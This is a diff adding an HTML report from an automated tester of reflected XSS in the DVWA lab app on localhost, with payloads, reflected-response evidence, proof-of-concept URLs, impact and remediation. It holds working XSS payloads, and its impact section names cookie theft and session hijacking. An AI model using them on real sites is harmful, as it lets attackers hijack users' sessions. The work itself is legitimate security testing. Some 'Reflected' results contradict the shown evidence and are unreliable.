@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OWASP OSCP-Style Security Assessment Report</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            background-color: #f5f5f5;
+        }
+        .header {
+            background-color: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 5px;
+        }
+        .section {
+            background-color: white;
+            margin: 20px 0;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1, h2, h3 {
+            color: #2c3e50;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #3498db;
+            color: white;
+        }
+        tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+        .success {
+            color: #27ae60;
+            font-weight: bold;
+        }
+        .failure {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+        .payload {
+            font-family: 'Courier New', monospace;
+            background-color: #f8f9fa;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+        .evidence {
+            font-family: 'Courier New', monospace;
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-left: 3px solid #3498db;
+            overflow-x: auto;
+            max-height: 150px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #7f8c8d;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>OWASP OSCP-Style Security Assessment Report</h1>
+        <p><strong>Vulnerability:</strong> Reflected Cross-Site Scripting (OTG-INPVAL-001)</p>
+        <p><strong>Target:</strong> http://localhost/dvwa</p>
+        <p><strong>Tested Level:</strong> Low</p>
+        <p><strong>Author:</strong> Automated XSS Tester</p>
+        <p><strong>Date:</strong> 2025-07-26 03:00:25</p>
+    </div>
+
+    <div class="section">
+        <h2>1. Executive Summary</h2>
+        <p>Reflected Cross-Site Scripting (XSS) is a type of vulnerability where an application includes unvalidated and unescaped user input in its output. This allows attackers to inject malicious scripts that are executed in the victim's browser.</p>
+        <p><strong>Risk Level:</strong> <span class="failure">High</span></p>
+        <p><strong>Summary:</strong> The application is vulnerable to Reflected XSS at Low security level. Unsanitized user input is directly reflected in the response, allowing script execution.</p>
+    </div>
+
+    <div class="section">
+        <h2>2. Technical Details</h2>
+        <p>The DVWA Reflected XSS module at Low security level does not implement any input validation or output encoding. When a user submits data through the input field, it is directly embedded into the HTML response without sanitization, making it vulnerable to script injection.</p>
+    </div>
+
+    <div class="section">
+        <h2>3. Test Results</h2>
+        <table>
+            <tr>
+                <th>Payload</th>
+                <th>Reflected</th>
+                <th>Executable</th>
+                <th>Evidence Snippet</th>
+            </tr>
+            <tr>
+                <td><span class="payload">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></td>
+                <td><span class="success">Yes</span></td>
+                <td><span class="success">Yes</span></td>
+                <td><div class="evidence"><div class="vulnerable_code_area">
+<form action="#" method="GET" name="XSS">
+<p>
+				What's your name?
+				<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</p>
+</form>
+<pre>Hello <script>alert('XSS')</script></pre>
+</div></div></td>
+            </tr>
+            <tr>
+                <td><span class="payload">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span></td>
+                <td><span class="failure">No</span></td>
+                <td><span class="success">Yes</span></td>
+                <td><div class="evidence"><div class="vulnerable_code_area">
+<form action="#" method="GET" name="XSS">
+<p>
+				What's your name?
+				<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</p>
+</form>
+<pre>Hello <img onerror="alert('XSS')" src="x"/></pre>
+</div></div></td>
+            </tr>
+            <tr>
+                <td><span class="payload">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span></td>
+                <td><span class="failure">No</span></td>
+                <td><span class="success">Yes</span></td>
+                <td><div class="evidence"><div class="vulnerable_code_area">
+<form action="#" method="GET" name="XSS">
+<p>
+				What's your name?
+				<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</p>
+</form>
+<pre>Hello <svg onload="alert('XSS')"></svg></pre>
+</div></div></td>
+            </tr>
+            <tr>
+                <td><span class="payload">%3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E</span></td>
+                <td><span class="success">Yes</span></td>
+                <td><span class="failure">No</span></td>
+                <td><div class="evidence"><div class="vulnerable_code_area">
+<form action="#" method="GET" name="XSS">
+<p>
+				What's your name?
+				<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</p>
+</form>
+<pre>Hello %3Cscript%3Ealert('XSS')%3C/script%3E</pre>
+</div></div></td>
+            </tr>
+            <tr>
+                <td><span class="payload">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;click me&lt;/a&gt;</span></td>
+                <td><span class="success">Yes</span></td>
+                <td><span class="success">Yes</span></td>
+                <td><div class="evidence"><div class="vulnerable_code_area">
+<form action="#" method="GET" name="XSS">
+<p>
+				What's your name?
+				<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</p>
+</form>
+<pre>Hello <a href="javascript:alert('XSS')">click me</a></pre>
+</div></div></td>
+            </tr>
+        </table>
+    </div>
+
+    <div class="section">
+        <h2>4. Proof of Concept</h2>
+        <p>The following URLs demonstrate the vulnerability:</p>
+        <div class="evidence">
+http://localhost/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+http://localhost/dvwa/vulnerabilities/xss_r/?name=&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
+http://localhost/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E
+        </div>
+        <p>When these URLs are accessed, the payload is executed in the browser context, demonstrating the vulnerability.</p>
+    </div>
+
+    <div class="section">
+        <h2>5. Impact</h2>
+        <p>Successful exploitation of this vulnerability could allow an attacker to:</p>
+        <ul>
+            <li>Steal session cookies and hijack user sessions</li>
+            <li>Perform actions on behalf of the victim</li>
+            <li>Deface the application</li>
+            <li>Redirect users to malicious sites</li>
+            <li>Capture keystrokes and sensitive information</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>6. Remediation Recommendations</h2>
+        <p>To mitigate Reflected XSS vulnerabilities, the following measures should be implemented:</p>
+        <ol>
+            <li><strong>Input Validation:</strong> Validate all user inputs against a whitelist of acceptable values.</li>
+            <li><strong>Output Encoding:</strong> Contextually encode data before rendering it in HTML, JavaScript, CSS, or URL contexts.</li>
+            <li><strong>Content Security Policy (CSP):</strong> Implement a strong CSP to restrict the sources from which scripts can be loaded.</li>
+            <li><strong>Use Secure Frameworks:</strong> Leverage frameworks that automatically escape output (e.g., React, Angular).</li>
+            <li><strong>Regular Security Testing:</strong> Conduct regular code reviews and penetration testing.</li>
+        </ol>
+    </div>
+
+    <div class="section">
+        <h2>7. References</h2>
+        <ul>
+            <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP Cross Site Scripting (XSS)</a></li>
+            <li><a href="https://github.com/digininja/DVWA">Damn Vulnerable Web Application (DVWA)</a></li>
+            <li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation</a></li>
+            <li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger XSS Cheat Sheet</a></li>
+        </ul>
+    </div>
+
+    <div class="footer">
+        <p>Report generated by Automated DVWA XSS Tester | For educational purposes only</p>
+    </div>
+</body>
+</html>
